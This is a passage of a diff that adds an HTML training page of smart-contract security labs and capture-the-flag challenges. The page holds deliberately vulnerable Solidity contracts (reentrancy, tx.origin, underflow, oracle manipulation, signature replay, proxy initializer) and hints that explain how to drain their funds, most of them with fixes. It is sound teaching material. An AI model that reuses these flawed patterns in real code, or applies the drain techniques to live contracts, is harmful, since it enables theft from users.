+    function heavyOperation() external {
+        // Uses more than 50000 gas
+        for (uint i = 0; i &lt; 100; i++) {
+            data.push(i);
+        }
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Call <code>relay()</code> with minimal gas — the inner call fails but txId is marked executed</li>
+              <li>Now the legitimate user can never execute this txId again</li>
+              <li>Fix: require <code>ok</code> to be true, or use <code>gasleft()</code> checks</li>
+              <li>Alternative fix: use EIP-150's 63/64 rule awareness</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Delegatecall Context Preservation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Demonstrate how <code>delegatecall</code> preserves msg.sender and msg.value context, and how this can be exploited if the delegated contract has a selfdestruct or ownership takeover function.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract Library {
+    address public owner;
+
+    function takeOwnership() public {
+        owner = msg.sender;  // in delegatecall context, writes to CALLER's storage
+    }
+
+    function destroy() public {
+        require(msg.sender == owner);
+        selfdestruct(payable(msg.sender));
+    }
+}
+
+contract Wallet {
+    address public owner;  // slot 0 — same as Library.owner
+    address public lib;
+
+    constructor(address _lib) {
+        owner = msg.sender;
+        lib = _lib;
+    }
+
+    fallback() external payable {
+        (bool ok, ) = lib.delegatecall(msg.data);
+        require(ok);
+    }
+
+    receive() external payable {}
+}</code></pre>
+<pre><code class="language-javascript">// Attack:
+// 1. Call wallet with takeOwnership() calldata
+// 2. delegatecall executes Library.takeOwnership in Wallet's context
+// 3. msg.sender (attacker) is written to Wallet.owner (slot 0)
+// 4. Now call destroy() through wallet — selfdestruct executes on Wallet!</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy Library and Wallet, then execute the ownership takeover</li>
+              <li>Why does slot 0 of Wallet get overwritten?</li>
+              <li>How does this relate to the Parity wallet hack ($150M frozen)?</li>
+              <li>Fix: use EIP-1967 slots and restrict delegatecall targets</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Chainlink Oracle Integration</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Replace a vulnerable spot-price oracle with Chainlink's decentralized price feed. Implement proper staleness checks and error handling.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+
+contract SecurePriceFeed {
+    AggregatorV3Interface public priceFeed;
+    uint256 public constant STALENESS_THRESHOLD = 3600; // 1 hour
+
+    constructor(address _feed) {
+        priceFeed = AggregatorV3Interface(_feed);
+    }
+
+    function getLatestPrice() public view returns (uint256) {
+        (
+            uint80 roundId,
+            int256 price,
+            ,
+            uint256 updatedAt,
+            uint80 answeredInRound
+        ) = priceFeed.latestRoundData();
+
+        // Validation checks
+        require(price > 0, "Invalid price");
+        require(updatedAt > 0, "Round not complete");
+        require(answeredInRound >= roundId, "Stale round");
+        require(
+            block.timestamp - updatedAt &lt; STALENESS_THRESHOLD,
+            "Price is stale"
+        );
+
+        return uint256(price);
+    }
+
+    function getDecimals() public view returns (uint8) {
+        return priceFeed.decimals();  // ETH/USD = 8 decimals
+    }
+}</code></pre>
+<pre><code class="language-bash"># Chainlink Price Feed addresses (Mainnet):
+# ETH/USD: 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419
+# BTC/USD: 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c
+
+# Test on Hardhat mainnet fork:
+# npx hardhat test --network hardhat</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy on a mainnet fork and fetch the live ETH/USD price</li>
+              <li>Test what happens when the price feed is stale (advance time in Hardhat)</li>
+              <li>Compare the security of this approach vs reading Uniswap reserves</li>
+              <li>What happens if the Chainlink oracle goes down? Add a fallback mechanism</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Commit-Reveal Implementation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Implement a commit-reveal scheme for a sealed-bid auction to prevent front-running of bids.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract SealedAuction {
+    address public seller;
+    uint256 public commitDeadline;
+    uint256 public revealDeadline;
+
+    struct Commit {
+        bytes32 hash;
+        bool revealed;
+    }
+
+    mapping(address => Commit) public commits;
+    address public highestBidder;
+    uint256 public highestBid;
+
+    constructor(uint256 _commitDuration, uint256 _revealDuration) {
+        seller = msg.sender;
+        commitDeadline = block.timestamp + _commitDuration;
+        revealDeadline = commitDeadline + _revealDuration;
+    }
+
+    // Phase 1: Submit hashed bid (bid value hidden)
+    function commit(bytes32 hash) external payable {
+        require(block.timestamp &lt; commitDeadline, "Commit phase over");
+        require(commits[msg.sender].hash == bytes32(0), "Already committed");
+        commits[msg.sender] = Commit(hash, false);
+    }
+
+    // Phase 2: Reveal actual bid
+    function reveal(uint256 bidAmount, bytes32 secret) external payable {
+        require(block.timestamp >= commitDeadline, "Commit phase active");
+        require(block.timestamp &lt; revealDeadline, "Reveal phase over");
+        require(!commits[msg.sender].revealed, "Already revealed");
+
+        bytes32 hash = keccak256(abi.encodePacked(msg.sender, bidAmount, secret));
+        require(hash == commits[msg.sender].hash, "Hash mismatch");
+        require(msg.value == bidAmount, "Must send bid amount");
+
+        commits[msg.sender].revealed = true;
+
+        if (bidAmount > highestBid) {
+            // Refund previous highest bidder
+            if (highestBidder != address(0)) {
+                payable(highestBidder).transfer(highestBid);
+            }
+            highestBid = bidAmount;
+            highestBidder = msg.sender;
+        } else {
+            payable(msg.sender).transfer(bidAmount);
+        }
+    }
+
+    function finalize() external {
+        require(block.timestamp >= revealDeadline, "Auction not over");
+        payable(seller).transfer(highestBid);
+    }
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy and simulate a 3-bidder auction</li>
+              <li>Verify that bids are hidden during the commit phase</li>
+              <li>Try to front-run a bid — the commit hash prevents it</li>
+              <li>What happens if a bidder commits but never reveals?</li>
+            </ol>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Drain the Vulnerable Bank</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">This bank contract has a classic reentrancy vulnerability. Write an attacker contract that drains all ETH from the bank. The bank starts with 10 ETH from other depositors. You have 1 ETH.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VaultChallenge {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount, "Insufficient");
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok);
+        balances[msg.sender] -= amount;
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The <code>withdraw</code> function sends ETH before updating the balance. Implement a <code>receive()</code> function in your attacker contract that calls <code>withdraw()</code> again. Deposit 1 ETH first, then call withdraw. Each re-entry will withdraw another 1 ETH because the balance hasn't been decremented yet.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Bypass tx.origin Check</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">This wallet uses <code>tx.origin</code> for authentication. Deploy an intermediate contract that, when called by the owner, exploits the <code>tx.origin</code> check to transfer all funds to your address. You must also handle the case where the wallet has a <code>receive()</code> function that logs deposits.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract SecureWallet {
+    address public owner;
+    uint256 public lastDeposit;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    receive() external payable {
+        lastDeposit = block.timestamp;
+    }
+
+    function withdrawAll(address payable to) public {
+        require(tx.origin == owner, "Not owner");
+        require(to != address(0), "Invalid address");
+        to.transfer(address(this).balance);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Create a contract with a function that looks legitimate (e.g., <code>claimAirdrop()</code>). When the owner calls it, your contract internally calls <code>wallet.withdrawAll(attacker)</code>. Since <code>tx.origin</code> will be the owner (the EOA who initiated the transaction), the check passes. The intermediate contract is <code>msg.sender</code>, but <code>tx.origin</code> remains the owner.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Chain Multiple Vulnerabilities</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">This DeFi protocol has multiple vulnerabilities. Chain at least two exploits together to drain all funds. The contract uses a price oracle, has a lending function, and an admin function with a flaw.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VulnerableProtocol {
+    mapping(address => uint256) public deposits;
+    mapping(address => uint256) public borrowed;
+    address public admin;
+    uint256 public tokenPrice = 1 ether;  // "oracle" price
+
+    constructor() payable {
+        admin = msg.sender;
+    }
+
+    function deposit() public payable {
+        deposits[msg.sender] += msg.value;
+    }
+
+    // Vuln 1: Anyone can set the price (no access control)
+    function setPrice(uint256 _price) public {
+        tokenPrice = _price;
+    }
+
+    // Vuln 2: Borrow based on manipulable price, no reentrancy guard
+    function borrow(uint256 amount) public {
+        uint256 collateralValue = deposits[msg.sender] * tokenPrice / 1 ether;
+        require(collateralValue >= amount, "Undercollateralized");
+        require(address(this).balance >= amount, "Insufficient liquidity");
+        borrowed[msg.sender] += amount;
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok);
+    }
+
+    // Vuln 3: No auth check on emergency withdraw
+    function emergencyWithdraw() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Multiple attack paths: (1) Simply call <code>emergencyWithdraw()</code> — it has no access control. (2) Call <code>setPrice()</code> to inflate the price to 1000 ETH, deposit 1 ETH as collateral, then <code>borrow()</code> the entire balance since your collateral is now "worth" 1000 ETH. (3) Combine price manipulation with reentrancy on <code>borrow()</code> — the <code>borrowed</code> mapping is updated before the check on the next re-entry because <code>collateralValue</code> stays inflated. The easiest path is just (1), but for practice, try chaining (2) to learn multi-step exploitation.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Reentrancy Variants — Read-Only</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A vault contract is protected by a reentrancy guard on all state-changing functions. However, a DeFi protocol reads the vault's <code>sharePrice()</code> during the reentrancy window. Exploit the inconsistent view to overborrow from the DeFi protocol.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract GuardedVault {
+    bool private locked;
+    mapping(address => uint256) public shares;
+    uint256 public totalShares;
+
+    modifier nonReentrant() { require(!locked); locked = true; _; locked = false; }
+
+    function deposit() public payable nonReentrant {
+        uint256 sharesToMint = msg.value;  // simplified
+        shares[msg.sender] += sharesToMint;
+        totalShares += sharesToMint;
+    }
+
+    function withdraw(uint256 shareAmount) public nonReentrant {
+        uint256 ethAmount = shareAmount * address(this).balance / totalShares;
+        shares[msg.sender] -= shareAmount;
+        totalShares -= shareAmount;
+        // ETH sent AFTER state update, but balance changes BEFORE totalShares in view
+        (bool ok, ) = msg.sender.call{value: ethAmount}("");
+        require(ok);
+    }
+
+    // View function: NOT protected by reentrancy guard
+    function sharePrice() public view returns (uint256) {
+        if (totalShares == 0) return 1 ether;
+        return address(this).balance * 1 ether / totalShares;
+    }
+}
+
+// Lending protocol that trusts sharePrice()
+contract VulnerableLender {
+    GuardedVault public vault;
+    mapping(address => uint256) public borrowed;
+
+    constructor(address _vault) { vault = GuardedVault(_vault); }
+
+    function borrowAgainstShares(uint256 shareAmount) external {
+        uint256 value = shareAmount * vault.sharePrice() / 1 ether;
+        borrowed[msg.sender] += value;
+        payable(msg.sender).transfer(value);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> During <code>withdraw()</code>, after <code>totalShares</code> is decremented but before ETH is sent, the <code>sharePrice()</code> is temporarily inflated (same balance, fewer shares). In your <code>receive()</code> callback, call <code>lender.borrowAgainstShares()</code> — it reads the inflated price. You borrow more than your shares are actually worth. The guard prevents re-entering the vault but NOT the lender.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Integer Manipulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">This token contract uses <code>unchecked</code> for gas optimization. Exploit the wrapping behavior to mint tokens for free.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract UncheckedToken {
+    mapping(address => uint256) public balanceOf;
+    uint256 public totalSupply;
+
+    constructor() {
+        balanceOf[msg.sender] = 1000;
+        totalSupply = 1000;
+    }
+
+    function transfer(address to, uint256 amount) public {
+        unchecked {
+            // "Gas optimization" — but enables underflow!
+            balanceOf[msg.sender] -= amount;
+            balanceOf[to] += amount;
+        }
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The <code>unchecked</code> block disables overflow/underflow checks. If your balance is 0 and you transfer 1 token, your balance underflows to <code>2^256 - 1</code> (a massive number). Call <code>transfer(anyAddress, 1)</code> from an account with zero balance. Your balance becomes ~1.15 * 10^77 tokens. The fix: add <code>require(balanceOf[msg.sender] >= amount)</code> before the subtraction.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Frontrunning Simulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A hash-based puzzle contract pays the first solver 10 ETH. You see a correct solution in the mempool. Write a contract that front-runs the solver by submitting the answer with higher gas priority.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract HashPuzzle {
+    bytes32 public target = keccak256(abi.encodePacked("s3cr3t_answ3r"));
+    bool public solved;
+
+    constructor() payable {}
+
+    function solve(string calldata answer) external {
+        require(!solved, "Already solved");
+        require(keccak256(abi.encodePacked(answer)) == target, "Wrong");
+        solved = true;
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}</code></pre>
+<pre><code class="language-javascript">// Frontrun simulation in Hardhat
+it("front-runs the solution", async () => {
+    const [deployer, victim, attacker] = await ethers.getSigners();
+    const Puzzle = await ethers.getContractFactory("HashPuzzle");
+    const puzzle = await Puzzle.deploy({ value: ethers.parseEther("10") });
+
+    // Victim broadcasts solution (attacker sees it in mempool)
+    const answer = "s3cr3t_answ3r";
+
+    // Attacker submits same answer first (simulated)
+    await puzzle.connect(attacker).solve(answer);
+    expect(await puzzle.solved()).to.equal(true);
+
+    // Victim's tx fails
+    await expect(puzzle.connect(victim).solve(answer))
+        .to.be.revertedWith("Already solved");
+});</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> In the real mempool, the answer is visible in the transaction's calldata. The attacker copies the calldata and submits with higher gas price. Fix: use a commit-reveal scheme where the solver first commits a hash of (answer + secret), waits a block, then reveals. The answer is never visible in the mempool before the commit is confirmed.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: DOS Gas Limit Attack</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">This contract distributes rewards to all participants. Add enough participants to make the distribution function exceed the block gas limit, permanently bricking the contract.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VulnerableDistributor {
+    address[] public participants;
+    mapping(address => uint256) public rewards;
+
+    function register() public payable {
+        require(msg.value == 0.01 ether);
+        participants.push(msg.sender);
+    }
+
+    // Vulnerable: unbounded loop
+    function distributeRewards() public {
+        uint256 share = address(this).balance / participants.length;
+        for (uint i = 0; i &lt; participants.length; i++) {
+            payable(participants[i]).transfer(share);
+            // If any transfer fails, entire function reverts
+            // If array is too large, exceeds block gas limit
+        }
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Register thousands of participant addresses (use a factory contract that deploys minimal contracts in a loop). Once the array is large enough (~1500+ entries), <code>distributeRewards()</code> will exceed the block gas limit (~30M gas). Even better: register a contract that reverts on <code>receive()</code> — this makes the transfer fail for that entry, reverting the entire distribution. Fix: use a pull payment pattern where users individually call <code>claim()</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Oracle Price Feed Manipulation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A lending protocol uses a simple AMM's reserves as its price oracle. Manipulate the reserves using a large swap to artificially inflate your collateral's value, then borrow more than your collateral is actually worth.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract OracleTarget {
+    // AMM with ETH/TOKEN pair
+    uint256 public reserveETH = 100 ether;
+    uint256 public reserveToken = 200000e18;
+
+    function getTokenPrice() public view returns (uint256) {
+        return reserveETH * 1e18 / reserveToken;  // spot price!
+    }
+
+    function swapETHForToken() external payable returns (uint256) {
+        uint256 tokensOut = (reserveToken * msg.value) / (reserveETH + msg.value);
+        reserveETH += msg.value;
+        reserveToken -= tokensOut;
+        return tokensOut;
+    }
+
+    function swapTokenForETH(uint256 tokenAmount) external returns (uint256) {
+        uint256 ethOut = (reserveETH * tokenAmount) / (reserveToken + tokenAmount);
+        reserveToken += tokenAmount;
+        reserveETH -= ethOut;
+        payable(msg.sender).transfer(ethOut);
+        return ethOut;
+    }
+}
+
+// Reads spot price — vulnerable to manipulation
+contract VulnerableLendingPool {
+    OracleTarget public oracle;
+    mapping(address => uint256) public collateralTokens;
+
+    constructor(address _oracle) payable { oracle = OracleTarget(_oracle); }
+
+    function depositCollateral(uint256 tokenAmount) external {
+        collateralTokens[msg.sender] += tokenAmount;
+    }
+
+    function borrow(uint256 ethAmount) external {
+        uint256 tokenPrice = oracle.getTokenPrice();
+        uint256 collateralValue = collateralTokens[msg.sender] * tokenPrice / 1e18;
+        require(collateralValue >= ethAmount, "Undercollateralized");
+        payable(msg.sender).transfer(ethAmount);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Swap a large amount of ETH into the AMM → <code>reserveETH</code> increases, <code>reserveToken</code> decreases → <code>getTokenPrice()</code> increases (each token is "worth" more ETH). Now your collateral tokens appear more valuable to the lending pool. Deposit tokens as collateral, borrow at the inflated price, then swap back to normalize. If done atomically (flash loan), you profit risk-free. The fix: use TWAP or Chainlink oracles.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Signature Replay Cross-Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">This contract verifies signatures for meta-transactions but doesn't include the chain ID. Replay a valid Ethereum mainnet signature on a testnet (or L2) deployment of the same contract to steal funds.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+
+contract ReplayableWallet {
+    using ECDSA for bytes32;
+    address public owner;
+    mapping(uint256 => bool) public usedNonces;
+
+    constructor() { owner = msg.sender; }
+
+    receive() external payable {}
+
+    // Missing: chain ID in the hash!
+    function execute(
+        address to, uint256 value, uint256 nonce, bytes calldata sig
+    ) external {
+        require(!usedNonces[nonce], "Nonce used");
+        usedNonces[nonce] = true;
+
+        // Vulnerable: no chain ID → cross-chain replay
+        bytes32 hash = keccak256(abi.encodePacked(to, value, nonce));
+        bytes32 ethHash = hash.toEthSignedMessageHash();
+        require(ethHash.recover(sig) == owner, "Invalid sig");
+
+        payable(to).transfer(value);
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Deploy the same contract on two chains. When the owner executes a transaction on Chain A (e.g., mainnet), capture the signature. On Chain B (e.g., Optimism), the same nonce hasn't been used, and the hash doesn't include chain ID — so the same signature is valid. Call <code>execute()</code> on Chain B with the captured sig to steal funds. Fix: include <code>block.chainid</code> and <code>address(this)</code> in the hash (EIP-712 domain separator).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Proxy Upgrade Hijack</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">An upgradeable proxy has an unprotected <code>initialize()</code> function on the implementation contract. Exploit it to become the admin and upgrade to a malicious implementation that drains all funds.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract ImplementationV1 {
+    address public admin;
+    mapping(address => uint256) public balances;
+    bool private initialized;
+
+    // Vuln: initializer is on the implementation, not the proxy
+    // Anyone can call it directly on the implementation contract!
+    function initialize() public {
+        require(!initialized, "Already initialized");
+        initialized = true;
+        admin = msg.sender;
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function adminWithdraw() public {
+        require(msg.sender == admin, "Not admin");
+        payable(admin).transfer(address(this).balance);
+    }
+}
+
+// The proxy delegatecalls to ImplementationV1
+// The proxy's storage has initialized=true, admin=deployer
+// BUT the implementation's own storage has initialized=false!</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The proxy's storage has <code>initialized=true</code> (set during proxy deployment), but the implementation contract's own storage has <code>initialized=false</code>. Call <code>initialize()</code> directly on the implementation contract (not through the proxy). You become admin of the implementation. If the implementation has a <code>selfdestruct</code> or if the proxy reads admin from the implementation's storage, you can hijack the system. This is the Wormhole-style vulnerability — always call <code>_disableInitializers()</code> in the implementation's constructor.</p>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
